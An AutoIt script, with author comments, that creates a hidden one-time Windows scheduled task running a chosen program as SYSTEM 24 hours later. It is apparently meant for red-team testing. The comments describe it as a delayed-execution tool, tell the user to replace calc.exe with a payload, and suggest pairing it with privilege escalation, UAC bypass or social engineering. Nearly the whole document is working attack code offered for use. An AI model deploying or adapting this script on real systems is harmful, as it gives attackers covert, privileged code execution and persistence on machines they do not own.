#comments-start

This script will need to be compiled to an excecutable via AutoIT and you will have to run it as an administrator.  It will be most effective it is combined with a Privilege Escaltion, UAC bypass, or Social Engineering.  It probably goes without saying, but you will want to change the file from calc.exe to whatever payload you want to test, and you may want to rename the scheduled task.  Side note, the script will fail if there is already a scheduled task of a given name, so you will want to increment the task name with a number each time if you conduct multiple successive tests on the same host.  Happy task scheduling!

#comments-end

#include <Date.au3>

; Get the current working directory for the output file
Global $sCurrentDir = @ScriptDir
Global $sOutputFile = $sCurrentDir & "\output.txt"

; Define the time delay (24 hours from now)
Global $sTime = _DateAdd('h', 24, _NowCalc())

; Check if the time calculation was successful
If @error Then
    FileWrite($sOutputFile, "Error calculating the time for 24 hours from now." & @CRLF)
    Exit
EndIf

; Split the date and time
Global $aDateTime = StringSplit($sTime, ' ')
If $aDateTime[0] <> 2 Then
    FileWrite($sOutputFile, "Error splitting the date and time." & @CRLF)
    Exit
EndIf

; Split the date into its components (handle slashes)
Global $aDateParts = StringSplit($aDateTime[1], '/')
If $aDateParts[0] <> 3 Then
    FileWrite($sOutputFile, "Error splitting the date into components." & @CRLF)
    Exit
EndIf

; Format the date and time for the scheduled task
Global $sFormattedDate = $aDateParts[2] & "/" & $aDateParts[3] & "/" & $aDateParts[1]
Global $sFormattedTime = StringLeft($aDateTime[2], 5)

; Define the task name and the executable to run
Global $sTaskName = "ScheduledTaskTest1"
Global $sExecutable = "calc.exe"

; Create the scheduled task command
Global $sCommand = 'SCHTASKS /CREATE /SC ONCE /TN "' & $sTaskName & '" /TR "' & $sExecutable & '" /ST ' & $sFormattedTime & ' /SD ' & $sFormattedDate & ' /RU "SYSTEM" /F > "' & $sOutputFile & '" 2>&1'

; Debugging: Write the command to the output file
FileWrite($sOutputFile, "Command: " & $sCommand & @CRLF)

; Run the command
RunWait(@ComSpec & " /c " & $sCommand, "", @SW_HIDE)

; Check if the command was successful
If @error Then
    FileWrite($sOutputFile, "Error creating the scheduled task." & @CRLF)
Else
    FileWrite($sOutputFile, "Scheduled task created to run calc.exe after 24 hours." & @CRLF)
EndIf

Exit
